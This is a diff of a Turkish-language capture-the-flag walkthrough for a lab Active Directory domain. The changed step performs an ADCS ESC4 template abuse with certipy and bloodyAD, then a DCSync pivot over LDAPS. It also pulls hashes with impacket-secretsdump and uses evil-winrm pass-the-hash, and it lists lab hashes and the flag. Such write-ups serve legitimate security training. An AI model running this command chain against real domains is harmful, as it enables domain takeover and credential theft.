@@ -402,13 +402,13 @@ python3 /tmp/gMSADumper.py -u svc_adcs -p 'xK9#mP2vL!qR7' \
 
 ---
 
-## ADIM 9 — ESC4: WriteDacl → DA Sertifikası (FLAG 4)
+# ADIM 9 — ESC4: WriteDacl → DCSync Pivot (FLAG 4)
 
-> **🎯 TRICK:** `gmsa_svc$` CorpUserCert template'inde WriteDacl yetkisine sahip.
-> Bu BloodHound'da **görünmez** — manuel certipy ile keşfedilmeli!
-> Normal kullanıcılar bu template'i göremez, sadece `gmsa_svc$` görebilir.
+> 🎯 **TRICK:** `gmsa_svc$` hesabı `CorpUserCert` template'inde **WriteDacl** yetkisine sahip. Bu durum BloodHound'da görünmeyebilir, manuel keşif kritiktir. Ayrıca hedef DC'de **PKINIT kapalı** olduğu için sertifika üzerinden doğrudan NT Hash alınamaz; sertifika LDAPS üzerinden kullanılarak DCSync yetkisi tanımlanmalıdır.
 
-### 9.1 Zafiyet Tara
+---
+
+## 9.1 Zafiyet Tarama
 
 ```bash
 certipy-ad find \
@@ -419,71 +419,84 @@ certipy-ad find \
     -vulnerable -stdout
 ```
 
-**Çıktıda:**
-```
-Template Name: CorpUserCert
-[!] Vulnerabilities
-  ESC4: User has dangerous permissions
-[+] User ACL Principals: SKYDAYS.CTF\gmsa_svc$
-```
+**Bulgu:** `ESC4: User has dangerous permissions` (Principal: `gmsa_svc$`)
 
-### 9.2 ESC4 Saldırısı
+---
+
+## 9.2 ESC4 Saldırısı ve Sertifika Talebi
+
+### TGT Al ve Oturumu Hazırla
 
 ```bash
-# TGT al
-impacket-getTGT 'skydays.ctf/gmsa_svc$' \
-    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
-    -dc-ip 10.10.10.10
+impacket-getTGT 'skydays.ctf/gmsa_svc$' -hashes ':4238e8054a5719629eeca1d0c861b27c' -dc-ip 10.10.10.10
 export KRB5CCNAME='./gmsa_svc$.ccache'
+```
 
-# Adım 1: Template flag değiştir (EnrolleeSuppliesSubject = 1)
-bloodyAD -u 'gmsa_svc$@skydays.ctf' -d skydays.ctf \
-    --host DC01.skydays.ctf --dc-ip 10.10.10.10 \
-    -k set object \
+### Adım 1: Template Konfigürasyonunu Değiştir (`EnrolleeSuppliesSubject = 1`)
+
+```bash
+bloodyAD -u 'gmsa_svc$@skydays.ctf' -d skydays.ctf --host DC01.skydays.ctf --dc-ip 10.10.10.10 -k set object \
     "CN=CorpUserCert,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=skydays,DC=ctf" \
     msPKI-Certificate-Name-Flag -v 1
+```
 
-# CA refresh bekle (~60 saniye)
-echo "[*] 65 saniye bekleniyor..."
-sleep 65
+### Adım 2: Administrator Adına Sertifika Talep Et
 
-# Adım 2: Administrator sertifikası al
+> ⏳ **Not:** CA refresh için ~65 saniye bekledikten sonra çalıştırın.
+
+```bash
 certipy-ad req \
-    -u 'gmsa_svc$@skydays.ctf' \
-    -hashes ':4238e8054a5719629eeca1d0c861b27c' \
-    -dc-ip 10.10.10.10 \
-    -target DC01.skydays.ctf \
-    -ca skydays-CA \
-    -template CorpUserCert \
-    -upn administrator@skydays.ctf
-
-# Adım 3: NT hash al
-certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.10.10
-```
-
-> **Not:** Restore script 3 dakikada bir template flag'ini sıfırlar.
-> Tüm adımları 3 dakika içinde tamamla!
-
-### 9.3 DCSync
-
-```bash
-impacket-secretsdump \
-    -hashes ':b1c9e39a927846156ae42de4a71349b2' \
-    'skydays.ctf/administrator@10.10.10.10' \
-    -just-dc-user krbtgt
-# krbtgt:502:...:f61b86ecaff4d1be66899c25fcfd361e
-```
-
-### 9.4 FLAG 4
-
-```bash
-evil-winrm -i 10.10.10.10 -u administrator \
-    -H 'b1c9e39a927846156ae42de4a71349b2'
-# type C:\Users\Administrator\Desktop\flag4.txt
-# SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}
+    -u 'gmsa_svc$@skydays.ctf' -hashes ':4238e8054a5719629eeca1d0c861b27c' \
+    -dc-ip 10.10.10.10 -target DC01.skydays.ctf \
+    -ca skydays-CA -template CorpUserCert -upn administrator@skydays.ctf
 ```
 
 ---
+
+## 9.3 DCSync Pivot (PKINIT Bypass)
+
+Hedef DC PKINIT desteklemediği için `certipy-ad auth` başarısız olacaktır. Bu aşamada sertifikayı kullanarak `gmsa_svc$` hesabına **DCSync yetkisi** tanımlıyoruz.
+
+### Adım 1: Sertifikayı Temizle ve Hazırla
+
+```bash
+# PFX'ten dosya çıkar (şifre boş)
+openssl pkcs12 -in administrator.pfx -nocerts -out admin.key -nodes -passin pass:
+openssl pkcs12 -in administrator.pfx -nokeys -out admin.crt -passin pass:
+
+# Gereksiz attribute'ları temizle
+sed -n '/-----BEGIN CERTIFICATE-----/,/-----END CERTIFICATE-----/p' admin.crt > clean.crt
+sed -n '/-----BEGIN PRIVATE KEY-----/,/-----END PRIVATE KEY-----/p' admin.key > clean.key
+```
+
+### Adım 2: LDAPS Üzerinden DCSync Yetkisi Tanımla
+
+```bash
+bloodyAD -d skydays.ctf -u 'administrator' -c 'clean.key:clean.crt' \
+    --host DC01.skydays.ctf --dc-ip 10.10.10.10 add dcsync 'gmsa_svc$'
+```
+
+### Adım 3: Secretsdump ile NT Hash Çekme
+
+Artık yetkili olan `gmsa_svc$` hesabı ile Administrator hash'ini çekiyoruz:
+
+```bash
+impacket-secretsdump 'skydays.ctf/gmsa_svc$@10.10.10.10' \
+    -hashes ':4238e8054a5719629eeca1d0c861b27c' -just-dc-user administrator
+
+# Administrator:500:aad3b435...:b1c9e39a927846156ae42de4a71349b2:::
+```
+
+---
+
+## 9.4 FLAG 4 (Pwn)
+
+```bash
+evil-winrm -i 10.10.10.10 -u administrator -H 'b1c9e39a927846156ae42de4a71349b2'
+
+# type C:\Users\Administrator\Desktop\flag4.txt
+# SKYDAYS{esc4_dcs_ync_d0ma1n_0wn3d}
+```
 
 ## ADIM 10 — BDC01: Trust Ticket & FLAG 5
 
